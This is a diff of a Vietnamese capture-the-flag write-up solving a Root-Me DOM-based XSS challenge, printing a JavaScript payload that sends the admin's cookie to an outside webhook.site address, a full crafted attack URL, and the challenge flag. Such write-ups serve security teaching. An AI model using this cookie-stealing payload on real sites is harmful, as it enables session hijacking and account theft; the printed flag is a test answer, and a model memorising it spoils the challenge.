@@ -135,5 +135,15 @@ Truy cập link http://challenge01.root-me.org/web-client/ch32/
 Thử kiểm tra XSS ở ô này bằng payload `';alert(1)//` thì thấy thành công:
 
 ![image](https://github.com/aQ05/Write-up/assets/121664384/59eb4aa4-52e2-46c2-afb2-2d29e91bb1ea)
-Sau đó thì sử dụng document.location để đánh cắp cookie của admin: `test'; document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?".concat(document.cookie);//`
+
+Sau đó thì sử dụng document.location để đánh cắp cookie của admin: `';document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?".concat(document.cookie)//`
+Giờ ta sẽ thực hiện POST lên bằng form bên tag contact:
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/017bb478-970d-4cc8-b378-22a5292029af)
+
+Payload: `http://challenge01.root-me.org/web-client/ch32/?number=';document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?".concat(document.cookie)//`
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/efc22fb4-692d-48c8-865c-955ec71f7ed1)
+
 ## Flag
+`rootme{XSS_D0M_BaSed_InTr0}`
